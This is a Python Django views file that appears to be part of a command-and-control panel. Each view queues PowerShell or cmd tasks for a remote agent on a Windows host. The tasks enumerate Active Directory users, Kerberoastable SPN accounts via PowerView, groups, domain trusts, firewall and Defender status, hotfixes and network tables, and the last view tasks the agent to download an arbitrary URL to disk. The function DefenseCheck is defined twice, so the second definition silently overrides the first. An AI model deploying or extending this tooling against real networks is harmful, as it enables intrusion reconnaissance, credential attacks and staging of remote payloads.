import os
from blog.views import *
from blog.models import *

current_path= os.path.dirname(os.path.abspath(__file__))

#### we need to download ../general/PowerView.ps1 on the windows machine


def ACCsforKerb(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============SPN Users===============";import-module c:\windows\temp\powerview.ps1;Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def ACC_listing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============useraccount list===============";wmic useraccount list /format:list'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def Adapter(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============ipconfig /all===============";ipconfig /all'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
    

def ArpTable(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============arp -a===============";arp -a'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def DefenseCheck(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============FireWall===============";netsh advfirewall show allprofiles;echo "===============Windows Defender status===============";sc query windefend;echo "===============Antimalware status===============";Get-MpComputerStatus'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def DomainInfo(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============Get-ADDomain===============";Get-ADDomain'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    
def DomainUsers(request, domain=''):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============USERS===============";net USERS /{}'.format(domain)
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def EnvActiveDirectoryValue(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============Environment values===============";Get-ChildItem Env: | ft Key,Value'       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    

def GroupsListing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============group list===============";wmic group list /format:list'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    

def Groups(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============Get-ADGroup *===============";Get-ADGroup -Filter * | select name'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
    
    
def HotFixes(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============Hot Fixes===============";wmic qfe get Caption,Description,HotFixID,InstalledOn'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def Ip4Route(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============IPv4 routing table===============";route print -4'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def ListExecPolicies(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============Get-ExecutionPolicy===============";Get-ExecutionPolicy -List'       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def ListingModules(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============Get-Module===============";Get-Module'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
def DefenseCheck(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============Logged-in users ===============";qwinsta'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
    
def SysaccListing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============sysaccount list===============";wmic sysaccount list /format:list'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def TrustMap(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============Get-DomainTrustMapping===============";import-module c:\windows\temp\powerview.ps1;Get-DomainTrustMapping'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    


def TrustRelation(request):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'echo "===============Get-ADTrust===============";Get-ADTrust -Filter *'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
def DownloadWindows(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        task = 'iwr -Uri {} -OutFile {}'.format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
